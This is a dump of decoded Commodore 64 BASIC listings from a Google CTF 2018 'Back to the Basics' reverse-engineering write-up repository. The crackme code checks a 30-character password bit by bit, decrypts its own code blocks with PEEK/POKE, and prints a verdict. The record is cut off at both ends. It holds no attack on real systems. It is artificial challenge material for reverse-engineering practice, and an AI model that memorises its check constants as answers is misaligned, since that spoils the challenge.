I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n618B <- 616E:  2009: POKE 1024 + CHKOFF + 14, 87\n---- <- 618B: -----: <BINARY>\n6684 <- 6649:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n66B9 <- 6684:  2905: POKE 1024 + CHKOFF + 14, A:POKE 55296 + CHKOFF + 14, B\n66E6 <- 66B9:  2910: POKE 03397, 00236 : POKE 03398, 00102 : GOTO 2001\n0000 <- 66E6:     0: REM\n6710 <- 66EC:  2001: POKE 03397, 00069 : POKE 03398, 00013\n6746 <- 6710:  2002: POKE 1024 + CHKOFF + 15, 81:POKE 55296 + CHKOFF + 15, 7\n676D <- 6746:  2004: ES = 26565 : EE = 27837 : EK = 192\n67A8 <- 676D:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n67C5 <- 67A8:  2009: POKE 1024 + CHKOFF + 15, 87\n---- <- 67C5: -----: <BINARY>\n6CFF <- 6CC4:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n6D34 <- 6CFF:  2905: POKE 1024 + CHKOFF + 15, A:POKE 55296 + CHKOFF + 15, B\n6D61 <- 6D34:  2910: POKE 03397, 00103 : POKE 03398, 00109 : GOTO 2001\n0000 <- 6D61:     0: REM\n6D8B <- 6D67:  2001: POKE 03397, 00069 : POKE 03398, 00013\n6DC1 <- 6D8B:  2002: POKE 1024 + CHKOFF + 16, 81:POKE 55296 + CHKOFF + 16, 7\n6DE8 <- 6DC1:  2004: ES = 28224 : EE = 29471 : EK = 157\n6E23 <- 6DE8:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n6E40 <- 6E23:  2009: POKE 1024 + CHKOFF + 16, 87\n---- <- 6E40: -----: <BINARY>\n7361 <- 7326:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n7396 <- 7361:  2905: POKE 1024 + CHKOFF + 16, A:POKE 55296 + CHKOFF + 16, B\n73C3 <- 7396:  2910: POKE 03397, 00201 : POKE 03398, 00115 : GOTO 2001\n0000 <- 73C3:     0: REM\n73ED <- 73C9:  2001: POKE 03397, 00069 : POKE 03398, 00013\n7423 <- 73ED:  2002: POKE 1024 + CHKOFF + 17, 81:POKE 55296 + CHKOFF + 17, 7\n744A <- 7423:  2004: ES = 29858 : EE = 31101 : EK = 158\n7485 <- 744A:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n74A2 <- 7485:  2009: POKE 1024 + CHKOFF + 17, 87\n---- <- 74A2: -----: <BINARY>\n79BF <- 7984:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n79F4 <- 79BF:  2905: POKE 1024 + CHKOFF + 17, A:POKE 55296 + CHKOFF + 17, B\n7A21 <- 79F4:  2910: POKE 03397, 00039 : POKE 03398, 00122 : GOTO 2001\n0000 <- 7A21:     0: REM\n7A4B <- 7A27:  2001: POKE 03397, 00069 : POKE 03398, 00013\n7A81 <- 7A4B:  2002: POKE 1024 + CHKOFF + 18, 81:POKE 55296 + CHKOFF + 18, 7\n7AA8 <- 7A81:  2004: ES = 31488 : EE = 32761 : EK = 235\n7AE3 <- 7AA8:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n7B00 <- 7AE3:  2009: POKE 1024 + CHKOFF + 18, 87\n---- <- 7B00: -----: <BINARY>\nC480 <- 7FFB: 36617: \n803B <- 8000:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n8070 <- 803B:  2905: POKE 1024 + CHKOFF + 18, A:POKE 55296 + CHKOFF + 18, B\n809D <- 8070:  2910: POKE 03397, 00163 : POKE 03398, 00128 : GOTO 2001\n0000 <- 809D:     0: REM\n80C7 <- 80A3:  2001: POKE 03397, 00069 : POKE 03398, 00013\n80FD <- 80C7:  2002: POKE 1024 + CHKOFF + 19, 81:POKE 55296 + CHKOFF + 19, 7\n8124 <- 80FD:  2004: ES = 33148 : EE = 34367 : EK = 143\n815F <- 8124:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n817C <- 815F:  2009: POKE 1024 + CHKOFF + 19, 87\n---- <- 817C: -----: <BINARY>\n8681 <- 8646:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n86B6 <- 8681:  2905: POKE 1024 + CHKOFF + 19, A:POKE 55296 + CHKOFF + 19, B\n86E3 <- 86B6:  2910: POKE 03397, 00239 : POKE 03398, 00134 : GOTO 2001\n0000 <- 86E3:     0: REM\n86EF <- 86E9:  2000: REM\n86F5 <- 86EF:  2001: REM\n875A <- 86F5: 31337: T = T0 + T1 + T2 + T3 + T4 + T5 + T6 + T7 + T8 + T9 + TA + TB + TC + TD + TE + TF + TG + TH + TJ\n8772 <- 875A: 31338: IF T = -19 THEN GOTO 31340\n8791 <- 8772: 31339: PRINT:PRINT\"VERDICT: NOPE\":GOTO 31345\n87AB <- 8791: 31340: PRINT:PRINT\"VERDICT: CORRECT\"\n87B7 <- 87AB: 31345: GOTO 31345\n0000 <- 87B7:     0: REM\n0000 <- 87BD:     0: \n", "timestamp": "2025-10-24T11:39:02.735140"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-06-23-Google-CTF-Quals/scripts/back-to-the-basics/listing2.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-06-23-Google-CTF-Quals/scripts/back-to-the-basics/listing2.txt", "content": "0801:     1: REM ======================\n081E:     2: REM === BACK TO BASICS ===\n083A:     3: REM ======================\n0857:    10: PRINTCHR$(155):PRINTCHR$(147)\n086B:    20: POKE 53280, 6:POKE 53281, 6:\n0886:    25: PRINT\"LOADING...\"\n0898: -----: <BINARY>\n0913: -----: <BINARY>\n0991: -----: <BINARY>\n0A0F: -----: <BINARY>\n0A8D: -----: <BINARY>\n0B09:    40: FOR I = 0 TO 39: POKE 55296 + I, 1: NEXT I\n0B2F:    41: FOR I = 40 TO 79: POKE 55296 + I, 15: NEXT I\n0B57:    42: FOR I = 80 TO 119: POKE 55296 + I, 12: NEXT I\n0B80:    43: FOR I = 120 TO 159: POKE 55296 + I, 11: NEXT I\n0BAA:    44: FOR I = 160 TO 199: POKE 55296 + I, 0: NEXT I\n0BD3:    50: FOR I = 0 TO 199\n0BE5:    51: READ C : POKE 1024 + I, C\n0BFD:    52: NEXT I\n0C05:    60: PRINT:PRINT:PRINT:PRINT:PRINT\n0C13:    70: POKE 19,1: PRINT\"PASSWORD PLEASE?\" CHR$(5): INPUT \"\"; P$: POKE 19,0\n0C4A:    80: PRINT:PRINT:PRINTCHR$(155) \"PROCESSING... (THIS MIGHT TAKE A WHILE)\":PRINT\"[                    ]\"\n0C9E:    90: CHKOFF = 11 * 40 + 1\n0CB7:   200: IF LEN(P$) = 30 THEN GOTO 250\n0CD0:   210: POKE 1024 + CHKOFF + 0, 86:POKE 55296 + CHKOFF + 0, 10\n0D05:   220: GOTO 31337\n0D11:   250: POKE 1024 + CHKOFF + 0, 83:POKE 55296 + CHKOFF + 0, 5\n0D45:  2000: REM NEVER GONNA GIVE YOU UP\n0D63:  2001: REM\n0D69:  2010: POKE 03397, 00199 : POKE 03398, 00013 : GOTO 2001\n0D96: 31337: PRINT:PRINT\"VERDICT: NOPE\":GOTO 31345\n0DB5: 31345: GOTO 31345\n0DC1:     0: REM\n0DC7:  2001: POKE 03397, 00069 : POKE 03398, 00013\n0DEB:  2002: POKE 1024 + CHKOFF + 1, 81:POKE 55296 + CHKOFF + 1, 7\n0E1F:  2004: ES = 03741 : EE = 04981 : EK = 148\n0E46:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n0E81:  2009: POKE 1024 + CHKOFF + 1, 87\n0E9D:  2010: V = 0.6666666666612316235641 - 0.00000000023283064365386962890625 : G = 0\n0EEB:  2020: BA = ASC( MID$(P$, 1, 1) )\n0F05:  2021: BB = ASC( MID$(P$, 2, 1) )\n0F1F:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n0F7E:  2030: IF BA AND 1 THEN P0 = 0.062500000001818989403545856475830078125\n0FBC:  2031: IF BA AND 2 THEN P1 = 0.0156250000004547473508864641189575195312\n0FFB:  2032: IF BA AND 4 THEN P2 = 0.0039062500001136868377216160297393798828\n103A:  2033: IF BA AND 8 THEN P3 = 0.0009765625000284217094304040074348449707\n1079:  2034: IF BA AND 16 THEN P4 = 0.0002441406250071054273576010018587112427\n10B9:  2035: IF BA AND 32 THEN P5 = 0.0000610351562517763568394002504646778107\n10F9:  2036: IF BA AND 64 THEN P6 = 0.0000152587890629440892098500626161694527\n1139:  2037: IF BA AND 128 THEN P7 = 0.0000038146972657360223024625156540423632\n117A:  2040: IF BB AND 1 THEN P8 = 0.0000009536743164340055756156289135105908\n11B9:  2031: IF BB AND 2 THEN P9 = 0.0000002384185791085013939039072283776477\n11F8:  2032: IF BB AND 4 THEN PA = 0.0000000596046447771253484759768070944119\n1237:  2033: IF BB AND 8 THEN PB = 0.000000014901161194281337118994201773603\n1275:  2034: IF BB AND 16 THEN PC = 0.0000000037252902985703342797485504434007\n12B5:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n1300:  2060: G = 0.671565706376017\n131A:  2100: T0 = K = G : A = 86 : B = 10\n133B:  2200: IF T0 = -1 THEN A = 83 : B = 5\n135A:  2210: POKE 1024 + CHKOFF + 1, 90\n1376:  2500: REM\n137C:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n13B7:  2905: POKE 1024 + CHKOFF + 1, A:POKE 55296 + CHKOFF + 1, B\n13EA:  2910: POKE 03397, 00029 : POKE 03398, 00020 : GOTO 2001\n1417:     0: REM\n141D:  2001: POKE 03397, 00069 : POKE 03398, 00013\n1441:  2002: POKE 1024 + CHKOFF + 2, 81:POKE 55296 + CHKOFF + 2, 7\n1475:  2004: ES = 05363 : EE = 06632 : EK = 152\n149C:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n14D7:  2009: POKE 1024 + CHKOFF + 2, 87\n14F3:  2010: V = 0.6666666666612316235641 - 0.00000000023283064365386962890625 : G = 0\n1541:  2020: BA = ASC( MID$(P$, 2, 1) )\n155B:  2021: BB = ASC( MID$(P$, 3, 1) )\n1575:  2022: BC = ASC( MID$(P$, 4, 1) )\n158F:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n15EE:  2030: IF BA AND 32 THEN P0 = 0.062500000001818989403545856475830078125\n162D:  2031: IF BA AND 64 THEN P1 = 0.0156250000004547473508864641189575195312\n166D:  2032: IF BA AND 128 THEN P2 = 0.0039062500001136868377216160297393798828\n16AE:  2033: IF BB AND 1 THEN P3 = 0.0009765625000284217094304040074348449707\n16ED:  2034: IF BB AND 2 THEN P4 = 0.0002441406250071054273576010018587112427\n172C:  2035: IF BB AND 4 THEN P5 = 0.0000610351562517763568394002504646778107\n176B:  2036: IF BB AND 8 THEN P6 = 0.0000152587890629440892098500626161694527\n17AA:  2037: IF BB AND 16 THEN P7 = 0.0000038146972657360223024625156540423632\n17EA:  2040: IF BB AND 32 THEN P8 = 0.0000009536743164340055756156289135105908\n182A:  2031: IF BB AND 64 THEN P9 = 0.0000002384185791085013939039072283776477\n186A:  2032: IF BB AND 128 THEN PA = 0.0000000596046447771253484759768070944119\n18AB:  2033: IF BC AND 1 THEN PB = 0.000000014901161194281337118994201773603\n18E9:  2034: IF BC AND 2 THEN PC = 0.0000000037252902985703342797485504434007\n1928:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n1973:  2060: G = 0.682612358126820\n198D:  2100: T1 = K = G : A = 86 : B = 10\n19AE:  2200: IF T1 = -1 THEN A = 83 : B = 5\n19CD:  2210: POKE 1024 + CHKOFF + 2, 90\n19E9:  2500: REM\n19EF:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n1A2A:  2905: POKE 1024 + CHKOFF + 2, A:POKE 55296 + CHKOFF + 2, B\n1A5D:  2910: POKE 03397, 00144 : POKE 03398, 00026 : GOTO 2001\n1A8A:     0: REM\n1A90:  2001: POKE 03397, 00069 : POKE 03398, 00013\n1AB4:  2002: POKE 1024 + CHKOFF + 3, 81:POKE 55296 + CHKOFF + 3, 7\n1AE8:  2004: ES = 07014 : EE = 08219 : EK = 165\n1B0F:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n1B4A:  2009: POKE 1024 + CHKOFF + 3, 87\n1B66:  2010: V = 0.6666666666612316235641 : G = 0\n1B8F:  2020: BA = ASC( MID$(P$, 4, 1) )\n1BA9:  2021: BB = ASC( MID$(P$, 5, 1) )\n1BC3:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n1C22:  2030: IF BA AND 4 THEN P0 = 0.062500000001818989403545856475830078125\n1C60:  2031: IF BA AND 8 THEN P1 = 0.0156250000004547473508864641189575195312\n1C9F:  2032: IF BA AND 16 THEN P2 = 0.0039062500001136868377216160297393798828\n1CDF:  2033: IF BA AND 32 THEN P3 = 0.0009765625000284217094304040074348449707\n1D1F:  2034: IF BA AND 64 THEN P4 = 0.0002441406250071054273576010018587112427\n1D5F:  2035: IF BA AND 128 THEN P5 = 0.0000610351562517763568394002504646778107\n1DA0:  2036: IF BB AND 1 THEN P6 = 0.0000152587890629440892098500626161694527\n1DDF:  2037: IF BB AND 2 THEN P7 = 0.0000038146972657360223024625156540423632\n1E1E:  2040: IF BB AND 4 THEN P8 = 0.0000009536743164340055756156289135105908\n1E5D:  2031: IF BB AND 8 THEN P9 = 0.0000002384185791085013939039072283776477\n1E9C:  2032: IF BB AND 16 THEN PA = 0.0000000596046447771253484759768070944119\n1EDC:  2033: IF BB AND 32 THEN PB = 0.000000014901161194281337118994201773603\n1F1B:  2034: IF BB AND 64 THEN PC = 0.0000000037252902985703342797485504434007\n1F5B:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n1FA6:  2060: G = 0.682552023325146\n1FC0:  2100: T2 = K = G : A = 86 : B = 10\n1FE1:  2200: IF T2 = -1 THEN A = 83 : B = 5\n2000:  2210: POKE 1024 + CHKOFF + 3, 90\n201C:  2500: REM\n2022:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n205D:  2905: POKE 1024 + CHKOFF + 3, A:POKE 55296 + CHKOFF + 3, B\n2090:  2910: POKE 03397, 00195 : POKE 03398, 00032 : GOTO 2001\n20BD:     0: REM\n20C3:  2001: POKE 03397, 00069 : POKE 03398, 00013\n20E7:  2002: POKE 1024 + CHKOFF + 4, 81:POKE 55296 + CHKOFF + 4, 7\n211B:  2004: ES = 08601 : EE = 09868 : EK = 184\n2142:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n217D:  2009: POKE 1024 + CHKOFF + 4, 87\n2199:  2010: V = 0.6666666666612316235641 - 0.00000000023283064365386962890625 : G = 0\n21E7:  2020: BA = ASC( MID$(P$, 5, 1) )\n2201:  2021: BB = ASC( MID$(P$, 6, 1) )\n221B:  2022: BC = ASC( MID$(P$, 7, 1) )\n2235:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n2294:  2030: IF BA AND 128 THEN P0 = 0.062500000001818989403545856475830078125\n22D4:  2031: IF BB AND 1 THEN P1 = 0.0156250000004547473508864641189575195312\n2313:  2032: IF BB AND 2 THEN P2 = 0.0039062500001136868377216160297393798828\n2352:  2033: IF BB AND 4 THEN P3 = 0.0009765625000284217094304040074348449707\n2391:  2034: IF BB AND 8 THEN P4 = 0.0002441406250071054273576010018587112427\n23D0:  2035: IF BB AND 16 THEN P5 = 0.0000610351562517763568394002504646778107\n2410:  2036: IF BB AND 32 THEN P6 = 0.0000152587890629440892098500626161694527\n2450:  2037: IF BB AND 64 THEN P7 = 0.0000038146972657360223024625156540423632\n2490:  2040: IF BB AND 128 THEN P8 = 0.0000009536743164340055756156289135105908\n24D1:  2031: IF BC AND 1 THEN P9 = 0.0000002384185791085013939039072283776477\n2510:  2032: IF BC AND 2 THEN PA = 0.0000000596046447771253484759768070944119\n254F:  2033: IF BC AND 4 THEN PB = 0.000000014901161194281337118994201773603\n258D:  2034: IF BC AND 8 THEN PC = 0.0000000037252902985703342797485504434007\n25CC:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n2617:  2060: G = 0.667647300753773\n2631:  2100: T3 = K = G : A = 86 : B = 10\n2652:  2200: IF T3 = -1 THEN A = 83 : B = 5\n2671:  2210: POKE 1024 + CHKOFF + 4, 90\n268D:  2500: REM\n2693:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n26CE:  2905: POKE 1024 + CHKOFF + 4, A:POKE 55296 + CHKOFF + 4, B\n2701:  2910: POKE 03397, 00052 : POKE 03398, 00039 : GOTO 2001\n272E:     0: REM\n2734:  2001: POKE 03397, 00069 : POKE 03398, 00013\n2758:  2002: POKE 1024 + CHKOFF + 5, 81:POKE 55296 + CHKOFF + 5, 7\n278C:  2004: ES = 10250 : EE = 11483 : EK = 199\n27B3:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n27EE:  2009: POKE 1024 + CHKOFF + 5, 87\n280A:  2010: V = 0.6666666666612316235641 : G = 0\n2833:  2020: BC = ASC( MID$(P$, 9, 1) )\n284D:  2021: BA = ASC( MID$(P$, 7, 1) )\n2867:  2022: BB = ASC( MID$(P$, 8, 1) )\n2881:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n28E0:  2030: IF BA AND 16 THEN P0 = 0.062500000001818989403545856475830078125\n291F:  2031: IF BA AND 32 THEN P1 = 0.0156250000004547473508864641189575195312\n295F:  2032: IF BA AND 64 THEN P2 = 0.0039062500001136868377216160297393798828\n299F:  2033: IF BA AND 128 THEN P3 = 0.0009765625000284217094304040074348449707\n29E0:  2034: IF BB AND 1 THEN P4 = 0.0002441406250071054273576010018587112427\n2A1F:  2035: IF BB AND 2 THEN P5 = 0.0000610351562517763568394002504646778107\n2A5E:  2036: IF BB AND 4 THEN P6 = 0.0000152587890629440892098500626161694527\n2A9D:  2037: IF BB AND 8 THEN P7 = 0.0000038146972657360223024625156540423632\n2ADC:  2040: IF BB AND 16 THEN P8 = 0.0000009536743164340055756156289135105908\n2B1C:  2031: IF BB AND 32 THEN P9 = 0.0000002384185791085013939039072283776477\n2B5C:  2032: IF BB AND 64 THEN PA = 0.0000000596046447771253484759768070944119\n2B9C:  2033: IF BB AND 128 THEN PB = 0.000000014901161194281337118994201773603\n2BDC:  2034: IF BC AND 1 THEN PC = 0.0000000037252902985703342797485504434007\n2C1B:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n2C66:  2060: G = 0.682310803327740\n2C80:  2100: T4 = K = G : A = 86 : B = 10\n2CA1:  2200: IF T4 = -1 THEN A = 83 : B = 5\n2CC0:  2210: POKE 1024 + CHKOFF + 5, 90\n2CDC:  2500: REM\n2CE2:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n2D1D:  2905: POKE 1024 + CHKOFF + 5, A:POKE 55296 + CHKOFF + 5, B\n2D50:  2910: POKE 03397, 00131 : POKE 03398, 00045 : GOTO 2001\n2D7D:     0: REM\n2D83:  2001: POKE 03397, 00069 : POKE 03398, 00013\n2DA7:  2002: POKE 1024 + CHKOFF + 6, 81:POKE 55296 + CHKOFF + 6, 7\n2DDB:  2004: ES = 11865 : EE = 13107 : EK = 240\n2E02:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n2E3D:  2009: POKE 1024 + CHKOFF + 6, 87\n2E59:  2010: V = 0.6666666666612316235641 - 0.00000000046566128730773925781250 : G = 0\n2EA7:  2020: BA = ASC( MID$(P$, 9, 1) )\n2EC1:  2021: BB = ASC( MID$(P$, 10, 1) )\n2EDC:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n2F3B:  2030: IF BA AND 2 THEN P0 = 0.062500000001818989403545856475830078125\n2F79:  2031: IF BA AND 4 THEN P1 = 0.0156250000004547473508864641189575195312\n2FB8:  2032: IF BA AND 8 THEN P2 = 0.0039062500001136868377216160297393798828\n2FF7:  2033: IF BA AND 16 THEN P3 = 0.0009765625000284217094304040074348449707\n3037:  2034: IF BA AND 32 THEN P4 = 0.0002441406250071054273576010018587112427\n3077:  2035: IF BA AND 64 THEN P5 = 0.0000610351562517763568394002504646778107\n30B7:  2036: IF BA AND 128 THEN P6 = 0.0000152587890629440892098500626161694527\n30F8:  2037: IF BB AND 1 THEN P7 = 0.0000038146972657360223024625156540423632\n3137:  2040: IF BB AND 2 THEN P8 = 0.0000009536743164340055756156289135105908\n3176:  2031: IF BB AND 4 THEN P9 = 0.0000002384185791085013939039072283776477\n31B5:  2032: IF BB AND 8 THEN PA = 0.0000000596046447771253484759768070944119\n31F4:  2033: IF BB AND 16 THEN PB = 0.000000014901161194281337118994201773603\n3233:  2034: IF BB AND 32 THEN PC = 0.0000000037252902985703342797485504434007\n3273:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n32BE:  2060: G = 0.670638734940470\n32D8:  2100: T5 = K = G : A = 86 : B = 10\n32F9:  2200: IF T5 = -1 THEN A = 83 : B = 5\n3318:  2210: POKE 1024 + CHKOFF + 6, 90\n3334:  2500: REM\n333A:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n3375:  2905: POKE 1024 + CHKOFF + 6, A:POKE 55296 + CHKOFF + 6, B\n33A8:  2910: POKE 03397, 00219 : POKE 03398, 00051 : GOTO 2001\n33D5:     0: REM\n33DB:  2001: POKE 03397, 00069 : POKE 03398, 00013\n33FF:  2002: POKE 1024 + CHKOFF + 7, 81:POKE 55296 + CHKOFF + 7, 7\n3433:  2004: ES = 13489 : EE = 14760 : EK = 249\n345A:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n3495:  2009: POKE 1024 + CHKOFF + 7, 87\n34B1:  2010: V = 0.6666666666612316235641 - 0.00000000046566128730773925781250 : G = 0\n34FF:  2020: BA = ASC( MID$(P$, 10, 1) )\n351A:  2021: BB = ASC( MID$(P$, 11, 1) )\n3535:  2022: BC = ASC( MID$(P$, 12, 1) )\n3550:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n35AF:  2030: IF BA AND 64 THEN P0 = 0.062500000001818989403545856475830078125\n35EE:  2031: IF BA AND 128 THEN P1 = 0.0156250000004547473508864641189575195312\n362F:  2032: IF BB AND 1 THEN P2 = 0.0039062500001136868377216160297393798828\n366E:  2033: IF BB AND 2 THEN P3 = 0.0009765625000284217094304040074348449707\n36AD:  2034: IF BB AND 4 THEN P4 = 0.0002441406250071054273576010018587112427\n36EC:  2035: IF BB AND 8 THEN P5 = 0.0000610351562517763568394002504646778107\n372B:  2036: IF BB AND 16 THEN P6 = 0.0000152587890629440892098500626161694527\n376B:  2037: IF BB AND 32 THEN P7 = 0.0000038146972657360223024625156540423632\n37AB:  2040: IF BB AND 64 THEN P8 = 0.0000009536743164340055756156289135105908\n37EB:  2031: IF BB AND 128 THEN P9 = 0.0000002384185791085013939039072283776477\n382C:  2032: IF BC AND 1 THEN PA = 0.0000000596046447771253484759768070944119\n386B:  2033: IF BC AND 2 THEN PB = 0.000000014901161194281337118994201773603\n38A9:  2034: IF BC AND 4 THEN PC = 0.0000000037252902985703342797485504434007\n38E8:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n3933:  2060: G = 0.729427094105661\n394D:  2100: T6 = K = G : A = 86 : B = 10\n396E:  2200: IF T6 = -1 THEN A = 83 : B = 5\n398D:  2210: POKE 1024 + CHKOFF + 7, 90\n39A9:  2500: REM\n39AF:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n39EA:  2905: POKE 1024 + CHKOFF + 7, A:POKE 55296 + CHKOFF + 7, B\n3A1D:  2910: POKE 03397, 00080 : POKE 03398, 00058 : GOTO 2001\n3A4A:     0: REM\n3A50:  2001: POKE 03397, 00069 : POKE 03398, 00013\n3A74:  2002: POKE 1024 + CHKOFF + 8, 81:POKE 55296 + CHKOFF + 8, 7\n3AA8:  2004: ES = 15142 : EE = 16351 : EK = 132\n3ACF:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n3B0A:  2009: POKE 1024 + CHKOFF + 8, 87\n3B26:  2010: V = 0.6666666666612316235641 : G = 0\n3B4F:  2020: BA = ASC( MID$(P$, 12, 1) )\n3B6A:  2021: BB = ASC( MID$(P$, 13, 1) )\n3B85:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n3BE4:  2030: IF BA AND 8 THEN P0 = 0.062500000001818989403545856475830078125\n3C22:  2031: IF BA AND 16 THEN P1 = 0.0156250000004547473508864641189575195312\n3C62:  2032: IF BA AND 32 THEN P2 = 0.0039062500001136868377216160297393798828\n3CA2:  2033: IF BA AND 64 THEN P3 = 0.0009765625000284217094304040074348449707\n3CE2:  2034: IF BA AND 128 THEN P4 = 0.0002441406250071054273576010018587112427\n3D23:  2035: IF BB AND 1 THEN P5 = 0.0000610351562517763568394002504646778107\n3D62:  2036: IF BB AND 2 THEN P6 = 0.0000152587890629440892098500626161694527\n3DA1:  2037: IF BB AND 4 THEN P7 = 0.0000038146972657360223024625156540423632\n3DE0:  2040: IF BB AND 8 THEN P8 = 0.0000009536743164340055756156289135105908\n3E1F:  2031: IF BB AND 16 THEN P9 = 0.0000002384185791085013939039072283776477\n3E5F:  2032: IF BB AND 32 THEN PA = 0.0000000596046447771253484759768070944119\n3E9F:  2033: IF BB AND 64 THEN PB = 0.000000014901161194281337118994201773603\n3EDE:  2034: IF BB AND 128 THEN PC = 0.0000000037252902985703342797485504434007\n3F1F:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n3F6A:  2060: G = 0.683334092143953\n3F84:  2100: T7 = K = G : A = 86 : B = 10\n3FA5:  2200: IF T7 = -1 THEN A = 83 : B = 5\n3FC4:  2210: POKE 1024 + CHKOFF + 8, 90\n3FE0:  2500: REM\n3FE6:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n4021:  2905: POKE 1024 + CHKOFF + 8, A:POKE 55296 + CHKOFF + 8, B\n4054:  2910: POKE 03397, 00135 : POKE 03398, 00064 : GOTO 2001\n4081:     0: REM\n4087:  2001: POKE 03397, 00069 : POKE 03398, 00013\n40AB:  2002: POKE 1024 + CHKOFF + 9, 81:POKE 55296 + CHKOFF + 9, 7\n40DF:  2004: ES = 16733 : EE = 17975 : EK = 186\n4106:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n4141:  2009: POKE 1024 + CHKOFF + 9, 87\n415D:  2010: V = 0.6666666666612316235641 - 0.00000000023283064365386962890625 : G = 0\n41AB:  2020: BA = ASC( MID$(P$, 14, 1) )\n41C6:  2021: BB = ASC( MID$(P$, 15, 1) )\n41E1:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n4240:  2030: IF BA AND 1 THEN P0 = 0.062500000001818989403545856475830078125\n427E:  2031: IF BA AND 2 THEN P1 = 0.0156250000004547473508864641189575195312\n42BD:  2032: IF BA AND 4 THEN P2 = 0.0039062500001136868377216160297393798828\n42FC:  2033: IF BA AND 8 THEN P3 = 0.0009765625000284217094304040074348449707\n433B:  2034: IF BA AND 16 THEN P4 = 0.0002441406250071054273576010018587112427\n437B:  2035: IF BA AND 32 THEN P5 = 0.0000610351562517763568394002504646778107\n43BB:  2036: IF BA 